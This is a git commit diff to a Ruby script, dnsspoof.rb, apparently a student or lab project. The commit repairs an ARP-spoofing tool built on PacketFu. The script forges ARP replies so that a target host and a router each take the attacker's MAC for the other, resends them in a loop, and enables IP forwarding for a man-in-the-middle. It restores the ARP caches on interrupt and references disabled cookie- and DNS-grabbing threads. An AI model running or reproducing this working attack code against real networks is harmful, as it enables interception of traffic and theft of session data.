87ed0e57f3460dd07a66b999048dde2c73b96b14
root <root@localhost.localdomain>
2014-11-01 19:13:46 -0700

    fixed arp spoofing

--- dnsspoof.rb
+++ dnsspoof.rb
@@ -4,64 +4,65 @@ require 'packetfu'
 require 'thread'
 require './gdns.rb'
 
-$iface = "em1"   # interface to send/recieve from
-$sMac = '78:2b:cb:96:ba:de'  # source mac address, eg, address to redirect victim to
-$tMac = '78:2b:cb:a3:db:85'  # target mac address, eg, address to poison
-$rMac = '00:1a:6d:38:15:ff'  # routers mac address
-$sIP = '192.168.0.12'        # source IP address
-$tIP = '192.168.0.11'        # target IP address
-$rIP = '192.168.0.100'       # router IP address
+$iface = "p2p1"   # interface to send/recieve from
+$sMac = '08:00:27:5d:d8:c9'  # source mac address, eg, address to redirect victim to
+$tMac = '50:e5:49:3a:52:de'  # target mac address, eg, address to poison
+$rMac = '00:24:b2:4d:b9:1d'  # routers mac address
+$sIP = '10.0.0.28'        # source IP address
+$tIP = '10.0.0.9'        # target IP address
+$rIP = '10.0.0.1'       # router IP address
 
-$arp_packet_target = PacketFu::ARPPacket.new()
-$arp_packet_router = PacketFu::ARPPacket.new()
+$arp_packet_target #= PacketFu::ARPPacket.new()
+$arp_packet_router #= PacketFu::ARPPacket.new()
 
-
-def main()
-  forgePacket(arp_packet_target, $sMac, $tMac, $tIP, $rIP)
-  forgePacket(arp_packet_router, $sMac, $rMac, $tIP, $rIP)
+def start()
+  # tell the target that your mac address is the router
+  $arp_packet_target = forgePacket($sMac, $tMac, $rIP, $tIP)
+  $arp_packet_router = forgePacket($sMac, $rMac, $tIP, $rIP)
   `echo 1 > /proc/sys/net/ipv4/ip_forward`
 end
 
-def forgePacket(arp_packet_target, sMac, tMac, tIP, rIP)
-  arp_packet_target = PacketFu::ARPPacket.new()
-  arp_packet_target.eth_saddr = sMac       # sender's MAC address
-  arp_packet_target.eth_daddr = tMac       # router's MAC address
-  arp_packet_target.arp_saddr_mac = sMac   # sender's MAC address
-  arp_packet_target.arp_daddr_mac = tMac   # router's MAC address
-  arp_packet_target.arp_saddr_ip = tIP     # target's IP
-  arp_packet_target.arp_daddr_ip = rIP     # router's IP
-  arp_packet_target.arp_opcode = 2         # arp code 2 == ARP reply
+def forgePacket(sMac, tMac, tIP, rIP)
+  target = PacketFu::ARPPacket.new()
+  target.eth_saddr = sMac       # sender's MAC address
+  target.eth_daddr = tMac       # targets MAC address
+  target.arp_saddr_mac = sMac   # sender's MAC address
+  target.arp_daddr_mac = tMac   # router's MAC address
+  target.arp_saddr_ip = tIP     # target's IP
+  target.arp_daddr_ip = rIP     # router's IP
+  target.arp_opcode = 2         # arp code 2 == ARP reply
+  return target
 end
 
-def fixSpoof(arp_packet_target, arp_packet_router)
-  forgePacket(arp_packet_target, $rMac, $tMac, $tIP, $rIP)
-  forgePacket(arp_packet_router, $tMac, $rMac, $tIP, $rIP)
-  arp_packet_target.to_w($iface)
-  arp_packet_router.to_w($iface)
+def fixSpoof()
+  $arp_packet_target = forgePacket($rMac, $tMac, $rIP, $tIP)
+  $arp_packet_router = forgePacket($tMac, $rMac, $tIP, $rIP)
+  $arp_packet_target.to_w($iface)
+  $arp_packet_router.to_w($iface)
   `echo 0 > /proc/sys/net/ipv4/ip_forward`
 end
 
-def runSpoof(arp_packet_target,arp_packet_router)
+def runSpoof()
   # Send out both packets
   caught=false
   while caught==false do
-    sleep 1
-    arp_packet_target.to_w($iface)
-    arp_packet_router.to_w($iface)
+    sleep 3
+    $arp_packet_target.to_w($iface)
+    $arp_packet_router.to_w($iface)
   end
 end
 
 begin
-  puts "Starting threads!"
-  spoof_thread = Thread.new{runSpoof($arp_packet_target, $arp_packet_router)} 
-  cookie_thread = Thread.new{cookie_grabber} 
+  start()
+  spoof_thread = Thread.new{runSpoof()} 
+  #cookie_thread = Thread.new{dns_grabber} 
   spoof_thread.join
-  cookie_thread.join
+  #cookie_thread.join
 
   rescue Interrupt # Catch the interrupt and kill the threads, and fix the arps
     puts "\nARP spoof stopped by interrupt signal."
     Thread.kill(spoof_thread)
-    Thread.kill(cookie_thread)
-    fixSpoof($arp_packet_target, $arp_packet_router)
+    #Thread.kill(cookie_thread)
+    fixSpoof()
   exit 0
 end
